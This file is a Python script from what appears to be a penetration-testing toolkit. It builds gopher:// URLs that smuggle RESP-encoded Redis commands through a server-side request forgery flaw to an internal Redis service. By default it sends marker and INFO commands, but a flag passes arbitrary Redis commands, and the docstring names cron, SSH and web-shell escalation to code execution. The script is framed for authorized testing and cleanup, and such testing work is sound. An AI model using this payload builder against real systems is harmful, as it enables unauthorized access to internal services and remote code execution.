#!/usr/bin/env python3
"""
gopher_redis.py — build a gopher:// URL that speaks the Redis protocol over an SSRF sink (guide §13).
gopher:// lets an SSRF send ARBITRARY bytes to a TCP service. Internal Redis (6379) is commonly
unauthenticated, so this is a frequent SSRF->RCE path.

DEFAULT IS BENIGN: it SETs a marker key and runs INFO — enough to PROVE you control internal Redis
via SSRF (already Critical). The destructive cron/SSH/web-shell escalations are described in the guide
(§13) and require explicit authorization + cleanup; this script does not emit them by default.

AUTHORIZED TESTING ONLY. Clean up any keys you set.

Usage:
  python3 gopher_redis.py --host 127.0.0.1 --port 6379 --benign
  python3 gopher_redis.py --host 127.0.0.1 --port 6379 --cmd "SET ssrf-poc 12345" --cmd "GET ssrf-poc"
"""
import argparse
import urllib.parse


def resp_encode(commands):
    """Encode a list of redis command strings as RESP, return raw bytes."""
    out = b""
    for cmd in commands:
        parts = cmd.split(" ")
        line = f"*{len(parts)}\r\n"
        for p in parts:
            line += f"${len(p)}\r\n{p}\r\n"
        out += line.encode()
    return out


def to_gopher(host, port, raw: bytes):
    # gopher payload: the type char '_' then URL-encoded raw bytes
    enc = urllib.parse.quote(raw, safe="")
    # redis tolerates CRLF; many SSRF clients also accept %0d%0a — quote handles it
    return f"gopher://{host}:{port}/_{enc}"


def main():
    ap = argparse.ArgumentParser(description="Build a gopher:// Redis payload for SSRF (benign by default).")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=6379)
    ap.add_argument("--benign", action="store_true", help="SET a marker key + INFO (proof of control)")
    ap.add_argument("--cmd", action="append", default=[], help="raw redis command (repeatable)")
    ap.add_argument("--marker", default="ssrf-poc-proof", help="marker key name for --benign")
    args = ap.parse_args()

    if args.benign or not args.cmd:
        commands = [f"SET {args.marker} reached_via_ssrf", f"GET {args.marker}", "INFO server"]
    else:
        commands = args.cmd

    raw = resp_encode(commands)
    url = to_gopher(args.host, args.port, raw)

    print("# Redis commands:")
    for c in commands:
        print(f"#   {c}")
    print("\n# RESP bytes:")
    print(repr(raw))
    print("\n# gopher URL — feed this to the SSRF sink (guide §13):")
    print(url)
    print("\n[i] A successful INFO/GET response (in-band) or a confirmed write proves internal Redis control via SSRF = Critical.")
    print("[i] Clean up: DEL the marker key. Destructive cron/SSH escalation: authorized testing only (guide §13/§23).")


if __name__ == "__main__":
    main()
